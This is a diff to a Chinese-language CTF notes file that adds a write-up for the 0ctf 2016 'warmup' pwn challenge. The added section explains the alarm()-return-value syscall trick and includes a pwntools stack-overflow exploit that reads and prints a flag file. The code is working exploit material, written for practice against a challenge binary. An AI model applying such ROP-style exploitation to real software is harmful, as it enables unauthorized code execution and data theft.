@@ -351,9 +351,45 @@ icon: icon-html
   r.interactive()
   ```
 
+* ### 0ctf 2016 warmup 
+
+  alarm返回值
+
+  如果调用此alarm()前，进程已经设置了闹钟时间，则返回上一个闹钟时间的剩余时间，否则返回0 
+
+  程序执行时间很短，第一次调用alarm(5)，然后再次调用alarm，返回5，得到open的系统调用号，然后跳到0x8048122执行系统调用打开flag
+
+  先找个地方把'/home/warmup/flag.txt\x00'写进去，然后两次alarm得到系统调用号，打开flag
+
+  调用read把flag写到0x8049200然后在write到标准输出
+
+  ```python
+  from pwn import *
+  #r = remote('pwn.buuoj.cn', 20000)
+  r = process('warmup')
+  flag = '/home/warmup/flag.txt\x00'
+  fuck_addr = 0x8049200
+  read = 0x804811d
+  write = 0x8048135
+  alarm = 0x804810d
+  main = 0x0804815a
+  fuck_open = 0x8048122
+  padding = 'a'*0x20
+  payload = padding+p32(read)+p32(main)+p32(0)+p32(fuck_addr)+p32(len(flag))
+  payload += flag
+  payload += padding+p32(alarm)+p32(main)+p32(5)+p32(0)+p32(0)
+  payload += padding+p32(alarm)+p32(fuck_open)+p32(main)+p32(fuck_addr)+p32(0)
+  payload += padding+p32(read)+p32(main)+p32(3)+p32(fuck_addr)+p32(100)
+  payload += padding+p32(write)+p32(0)+p32(1)+p32(fuck_addr)+p32(100)
+  r.sendline(payload)
+  r.interactive()
+  ```
+
+  本地能跑出来远程跑不成，gg
+
+  
+
 * 
-
-
 
 
 
